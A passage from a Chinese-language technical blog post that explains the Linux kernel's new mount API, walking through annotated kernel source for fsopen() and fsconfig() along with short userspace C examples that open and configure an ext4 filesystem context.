&#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Successfully get an ext4 filesystem context descriptor:%d\n&quot;</span>, fs_fd);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>需要注意的是这里创建的是一个<strong>空白的文件系统上下文</strong>，并没有与任何实际设备或文件进行关联——这是我们需要在接下来的步骤中完成的配置</p><h4 id="✳-fsopen-in-kernel"><a href="#✳-fsopen-in-kernel" class="headerlink" title="✳ fsopen() in kernel"></a><strong>✳</strong> fsopen() in kernel</h4><blockquote><p>superblock、dentry 这类的 VFS 基础知识不在此处科普，请自行了解：）</p></blockquote><p>在内核当中，<code>fsopen()</code> 系统调用的行为实际上对应创建的是一个 <code>fs_context</code> 结构体作为 filesystem context，创建一个对应的 file 结构体并分配一个文件描述符：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 按名称打开文件系统以便于对其进行设置以挂载</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 我们被允许指定在哪个容器中打开文件系统，由此指示要使用哪一个命名空间</span><br><span class="hljs-comment"> * (尤其是将哪个网络命名空间用于网络文件系统).</span><br><span class="hljs-comment"> */</span><br>SYSCALL_DEFINE2(fsopen, <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *, _fs_name, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, flags)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_system_type</span> *<span class="hljs-title">fs_type</span>;</span><span class="hljs-comment">//文件系统类型</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_context</span> *<span class="hljs-title">fc</span>;</span><span class="hljs-comment">//文件系统上下文</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *fs_name;<br><span class="hljs-type">int</span> ret;<br><br><span class="hljs-comment">// capabilities 机制，检查对应【命名空间】是否有 CAP_SYS_ADMIN 权限</span><br><span class="hljs-keyword">if</span> (!ns_capable(current-&gt;nsproxy-&gt;mnt_ns-&gt;user_ns, CAP_SYS_ADMIN))<br><span class="hljs-keyword">return</span> -EPERM;<br><br><span class="hljs-keyword">if</span> (flags &amp; ~FSOPEN_CLOEXEC)<br><span class="hljs-keyword">return</span> -EINVAL;<br><br><span class="hljs-comment">// 拷贝用户传入的文件系统名</span><br>fs_name = strndup_user(_fs_name, PAGE_SIZE);<br><span class="hljs-keyword">if</span> (IS_ERR(fs_name))<br><span class="hljs-keyword">return</span> PTR_ERR(fs_name);<br><br><span class="hljs-comment">// 按名称获取文件系统类型</span><br>fs_type = get_fs_type(fs_name);<br>kfree(fs_name);<br><span class="hljs-keyword">if</span> (!fs_type)<br><span class="hljs-keyword">return</span> -ENODEV;<br><br><span class="hljs-comment">// 创建文件系统上下文结构体</span><br>fc = fs_context_for_mount(fs_type, <span class="hljs-number">0</span>);<br>put_filesystem(fs_type);<br><span class="hljs-keyword">if</span> (IS_ERR(fc))<br><span class="hljs-keyword">return</span> PTR_ERR(fc);<br><br>fc-&gt;phase = FS_CONTEXT_CREATE_PARAMS;<br><br><span class="hljs-comment">// 分配 Logging buffer</span><br>ret = fscontext_alloc_log(fc);<br><span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">goto</span> err_fc;<br><br><span class="hljs-comment">// 创建 file 结构体并分配文件描述符</span><br><span class="hljs-keyword">return</span> fscontext_create_fd(fc, flags &amp; FSOPEN_CLOEXEC ? O_CLOEXEC : <span class="hljs-number">0</span>);<br><br>err_fc:<br>put_fs_context(fc);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>其中 <code>fs_context</code> 的具体定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 用以保存在创建与重新配置一个 superblock 中的参数的文件系统上下文</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Superblock 的创建会填充到 -&gt;root 中，重新配置需要该字段已经设置.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 参见 Documentation/filesystems/mount_api.txt</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_context</span> &#123;</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_context_operations</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span><span class="hljs-title">uapi_mutex</span>;</span><span class="hljs-comment">/* 用户空间访问的互斥锁 */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_system_type</span>*<span class="hljs-title">fs_type</span>;</span><br><span class="hljs-type">void</span>*fs_private;<span class="hljs-comment">/* 文件系统的上下文 */</span><br><span class="hljs-type">void</span>*sget_key;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dentry</span>*<span class="hljs-title">root</span>;</span><span class="hljs-comment">/* root 与 superblock */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_namespace</span>*<span class="hljs-title">user_ns</span>;</span><span class="hljs-comment">/* 将要挂载的用户命名空间 */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net</span>*<span class="hljs-title">net_ns</span>;</span><span class="hljs-comment">/* 将要挂载的网络1命名空间 */</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span>*<span class="hljs-title">cred</span>;</span><span class="hljs-comment">/* 挂载者的 credentials */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fc_log</span>*<span class="hljs-title">log</span>;</span><span class="hljs-comment">/* Logging buffer */</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span>*source;<span class="hljs-comment">/* 源 (eg. 设备路径) */</span><br><span class="hljs-type">void</span>*security;<span class="hljs-comment">/* Linux S&amp;M 设置 */</span><br><span class="hljs-type">void</span>*s_fs_info;<span class="hljs-comment">/* Proposed s_fs_info */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>sb_flags;<span class="hljs-comment">/* Proposed superblock flags (SB_*) */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>sb_flags_mask;<span class="hljs-comment">/* Superblock flags that were changed */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>s_iflags;<span class="hljs-comment">/* OR&#x27;d with sb-&gt;s_iflags */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>lsm_flags;<span class="hljs-comment">/* Information flags from the fs to the LSM */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">fs_context_purpose</span><span class="hljs-title">purpose</span>:</span><span class="hljs-number">8</span>;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">fs_context_phase</span><span class="hljs-title">phase</span>:</span><span class="hljs-number">8</span>;<span class="hljs-comment">/* The phase the context is in */</span><br><span class="hljs-type">bool</span>need_free:<span class="hljs-number">1</span>;<span class="hljs-comment">/* 需要调用 ops-&gt;free() */</span><br><span class="hljs-type">bool</span>global:<span class="hljs-number">1</span>;<span class="hljs-comment">/* Goes into &amp;init_user_ns */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p><code>fs_context</code> 的初始化在 <code>alloc_fs_context()</code> 中完成，在 <code>fsopen()</code> 中对应的是 <code>FS_CONTEXT_FOR_MOUNT</code> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * alloc_fs_context - 创建一个文件系统上下文.</span><br><span class="hljs-comment"> * @fs_type: 文件系统类型.</span><br><span class="hljs-comment"> * @reference: The dentry from which this one derives (or NULL)//想不出咋翻</span><br><span class="hljs-comment"> * @sb_flags: Filesystem/superblock 标志位 (SB_*)</span><br><span class="hljs-comment"> * @sb_flags_mask: @sb_flags 中可用的成员</span><br><span class="hljs-comment"> * @purpose: 本次配置的目的.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 打开一个文件系统并创建一个挂载上下文（mount context），挂载上下文被以对应的标志位进行初始化，</span><br><span class="hljs-comment"> * 若从另一个 superblock （引自 @reference）进行 submount/automount，</span><br><span class="hljs-comment"> * 则可能由从该 superblock 拷贝来的参数1（如命名空间）.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> fs_context *<span class="hljs-title function_">alloc_fs_context</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file_system_type *fs_type,</span><br><span class="hljs-params">      <span class="hljs-keyword">struct</span> dentry *reference,</span><br><span class="hljs-params">      <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> sb_flags,</span><br><span class="hljs-params">      <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> sb_flags_mask,</span><br><span class="hljs-params">      <span class="hljs-keyword">enum</span> fs_context_purpose purpose)</span><br>&#123;<br><span class="hljs-type">int</span> (*init_fs_context)(<span class="hljs-keyword">struct</span> fs_context *);<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_context</span> *<span class="hljs-title">fc</span>;</span><br><span class="hljs-type">int</span> ret = -ENOMEM;<br><br><span class="hljs-comment">// 分配 fs_context 结构体</span><br>fc = kzalloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> fs_context), GFP_KERNEL);<br><span class="hljs-keyword">if</span> (!fc)<br><span class="hljs-keyword">return</span> ERR_PTR(-ENOMEM);<br><br><span class="hljs-comment">// 设置对应属性</span><br>fc-&gt;purpose= purpose;<br>fc-&gt;sb_flags= sb_flags;<br>fc-&gt;sb_flags_mask = sb_flags_mask;<br>fc-&gt;fs_type= get_filesystem(fs_type);<br>fc-&gt;cred= get_current_cred();<br>fc-&gt;net_ns= get_net(current-&gt;nsproxy-&gt;net_ns);<br><br>mutex_init(&amp;fc-&gt;uapi_mutex);<br><br><span class="hljs-comment">// 由 purpose 设置对应的命名空间</span><br><span class="hljs-keyword">switch</span> (purpose) &#123;<br><span class="hljs-keyword">case</span> FS_CONTEXT_FOR_MOUNT:<br>fc-&gt;user_ns = get_user_ns(fc-&gt;cred-&gt;user_ns);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> FS_CONTEXT_FOR_SUBMOUNT:<br>fc-&gt;user_ns = get_user_ns(reference-&gt;d_sb-&gt;s_user_ns);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> FS_CONTEXT_FOR_RECONFIGURE:<br><span class="hljs-type">atomic_inc</span>(&amp;reference-&gt;d_sb-&gt;s_active);<br>fc-&gt;user_ns = get_user_ns(reference-&gt;d_sb-&gt;s_user_ns);<br>fc-&gt;root = dget(reference);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-comment">/* <span class="hljs-doctag">TODO:</span> 让所有的文件系统无条件支持这块 */</span><br>init_fs_context = fc-&gt;fs_type-&gt;init_fs_context;<br><span class="hljs-keyword">if</span> (!init_fs_context)<br>init_fs_context = legacy_init_fs_context;<br><br><span class="hljs-comment">// 初始化 fs_context</span><br>ret = init_fs_context(fc);<br><span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">goto</span> err_fc;<br>fc-&gt;need_free = <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">return</span> fc;<br><br>err_fc:<br>put_fs_context(fc);<br><span class="hljs-keyword">return</span> ERR_PTR(ret);<br>&#125;<br></code></pre></td></tr></table></figure><p>在完成了通用的初始化工作后，最终进行具体文件系统对应初始化工作的其实是调用 <code>file_system_type</code> 中的 <code>init_fs_context</code> 函数指针对应的函数完成的，这里我们可以看到对于未设置 <code>init_fs_context</code> 的文件系统类型而言其最终会调用 <code>legacy_init_fs_context()</code> 进行初始化，主要就是为 <code>fs_context-&gt;fs_private</code> 分配一个 <code>legacy_fs_context</code> 结构体，并将 <code>fs_context</code> 的函数表设置为 <code>legacy_fs_context_ops</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">legacy_init_fs_context</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fs_context *fc)</span><br>&#123;<br>fc-&gt;fs_private = kzalloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> legacy_fs_context), GFP_KERNEL);<br><span class="hljs-keyword">if</span> (!fc-&gt;fs_private)<br><span class="hljs-keyword">return</span> -ENOMEM;<br>fc-&gt;ops = &amp;legacy_fs_context_ops;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p> <code>legacy_fs_context</code> 结构体的定义如下，标识了一块指定长度与类型的缓冲区：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">legacy_fs_context</span> &#123;</span><br><span class="hljs-type">char</span>*legacy_data;<span class="hljs-comment">/* Data page for legacy filesystems */</span><br><span class="hljs-type">size_t</span>data_size;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">legacy_fs_param</span><span class="hljs-title">param_type</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="Step-II-fsconfig-设置-filesystem-context-的相关参数与操作"><a href="#Step-II-fsconfig-设置-filesystem-context-的相关参数与操作" class="headerlink" title="Step.II - fsconfig: 设置 filesystem context 的相关参数与操作"></a>Step.II - fsconfig: 设置 filesystem context 的相关参数与操作</h3><p>在完成了空白的文件系统上下文的创建之后，我们还需要对其进行相应的配置，以便于后续的挂载操作，这个配置的功能对应到的就是 <code>fsconfig()</code> 系统调用</p><p> <code>fsconfig()</code> 系统调用根据不同的 cmd 进行不同的操作，对于挂载文件系统而言其核心操作主要就是两个 cmd：</p><ul><li><code>FSCONFIG_SET_STRING</code> ：设置不同的键值对参数</li><li><code>FSCONFIG_CMD_CREATE</code>：获得一个 superblock 并创建一个 root entry</li></ul><p>示例用法如下所示，这里创建了一个键值对 <code>&quot;source&quot;=/dev/sdb1</code> 表示文件系统源所在的设备名：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mount.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsopen</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsopen 430</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsconfig</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsconfig 431</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsopen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *fs_name, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsopen, fs_name, flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsconfig</span><span class="hljs-params">(<span class="hljs-type">int</span> fsfd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *key, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *val, <span class="hljs-type">int</span> aux)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> fs_fd;<br>    <br>    fs_fd = fsopen(<span class="hljs-string">&quot;ext4&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (fs_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] FAILED to fsopen!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Successfully get an ext4 filesystem context descriptor:%d\n&quot;</span>, fs_fd);<br><br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;source&quot;</span>, <span class="hljs-string">&quot;/dev/sdb1&quot;</span>, <span class="hljs-number">0</span>);<br>    fsconfig(fs_fd, FSCONFIG_CMD_CREATE, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="✳-fsconfig-in-kernel"><a href="#✳-fsconfig-in-kernel" class="headerlink" title="✳ fsconfig() in kernel"></a>✳ fsconfig() in kernel</h4><p>内核空间中的 <code>fsconfig()</code> 实现比较长，但主要就是根据 cmd 进行各种 switch，这里就不贴完整的源码了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs c">SYSCALL_DEFINE5(fsconfig,<br><span class="hljs-type">int</span>, fd,<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, cmd,<br><span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *, _key,<br><span class="hljs-type">const</span> <span class="hljs-type">void</span> __user *, _value,<br><span class="hljs-type">int</span>, aux)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_context</span> *<span class="hljs-title">fc</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fd</span> <span class="hljs-title">f</span>;</span><br><span class="hljs-type">int</span> ret;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_parameter</span> <span class="hljs-title">param</span> =</span> &#123;<br>.type= fs_value_is_undefined,<br>&#125;;<br><br><span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> -EINVAL;<br><br><span class="hljs-keyword">switch</span> (cmd) &#123;<br><span class="hljs-keyword">case</span> FSCONFIG_SET_FLAG:<br><span class="hljs-comment">// 主要是参数的各种检查</span><br><span class="hljs-comment">// ...</span><br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">return</span> -EOPNOTSUPP;<br>&#125;<br><br><span class="hljs-comment">// 获取文件描述符</span><br>f = fdget(fd);<br><span class="hljs-keyword">if</span> (!f.file)<br><span class="hljs-keyword">return</span> -EBADF;<br>ret = -EINVAL;<br><span class="hljs-keyword">if</span> (f.file-&gt;f_op != &amp;fscontext_fops)<br><span class="hljs-keyword">goto</span> out_f;<br><br><span class="hljs-comment">// 获取 fs_context，存储在文件描述符的 private_data 字段</span><br>fc = f.file-&gt;private_data;<br><span class="hljs-keyword">if</span> (fc-&gt;ops == &amp;legacy_fs_context_ops) &#123;<br><span class="hljs-keyword">switch</span> (cmd) &#123; <span class="hljs-comment">// 一个操作都没实现</span><br><span class="hljs-keyword">case</span> FSCONFIG_SET_BINARY:<br><span class="hljs-keyword">case</span> FSCONFIG_SET_PATH:<br><span class="hljs-keyword">case</span> FSCONFIG_SET_PATH_EMPTY:<br><span class="hljs-keyword">case</span> FSCONFIG_SET_FD:<br>ret = -EOPNOTSUPP;<br><span class="hljs-keyword">goto</span> out_f;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// 拷贝 key 字段到内核空间</span><br><span class="hljs-keyword">if</span> (_key) &#123;<br>param.key = strndup_user(_key, <span class="hljs-number">256</span>);<br><span class="hljs-keyword">if</span> (IS_ERR(param.key)) &#123;<br>ret = PTR_ERR(param.key);<br><span class="hljs-keyword">goto</span> out_f;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// 根据不同的 cmd 进行 param 的不同设置</span><br><span class="hljs-keyword">switch</span> (cmd) &#123;<br><span class="hljs-comment">// ...</span><br><span class="hljs-comment">// 我们主要关注这个 cmd</span><br><span class="hljs-keyword">case</span> FSCONFIG_SET_STRING:<br>param.type = fs_value_is_string;<br>param.<span class="hljs-built_in">string</span> = strndup_user(_value, <span class="hljs-number">256</span>);<br><span class="hljs-keyword">if</span> (IS_ERR(param.<span class="hljs-built_in">string</span>)) &#123;<br>ret = PTR_ERR(param.<span class="hljs-built_in">string</span>);<br><span class="hljs-keyword">goto</span> out_key;<br>&#125;<br>param.size = <span class="hljs-built_in">strlen</span>(param.<span class="hljs-built_in">string</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-comment">// ...</span><br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br>ret = mutex_lock_interruptible(&amp;fc-&gt;uapi_mutex);<br><span class="hljs-keyword">if</span> (ret == <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">// 根据前面设置的 param 进行 VFS 相关操作</span><br>ret = vfs_fsconfig_locked(fc, cmd, &amp;param);<br>mutex_unlock(&amp;fc-&gt;uapi_mutex);<br>&#125;<br><br><span class="hljs-comment">/* Clean up the our record of any value that we obtained from</span><br><span class="hljs-comment"> * userspace.  Note that the value may have been stolen by the LSM or</span><br><span class="hljs-comment"> * filesystem, in which case the value pointer will have been cleared.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">switch</span> (cmd) &#123;<br><span class="hljs-keyword">case</span> FSCONFIG_SET_STRING:<br><span class="hljs-comment">// 临时数据清理工作</span><br><span class="hljs-comment">//...</span><br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">break</span>;<br>&#125;<br>out_key:<br>kfree(param.key);<br>out_f:<br>fdput(f);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>而 <code>fsconfig()</code> 的核心作用主要还是根据 cmd 进行参数的封装，最后进入到 VFS 中的操作则通过 <code>vfs_fsconfig_locked()</code> 完成</p><h3 id="Step-III-fsmount-获取一个挂载实例"><a href="#Step-III-fsmount-获取一个挂载实例" class="headerlink" title="Step.III - fsmount: 获取一个挂载实例"></a>Step.III - fsmount: 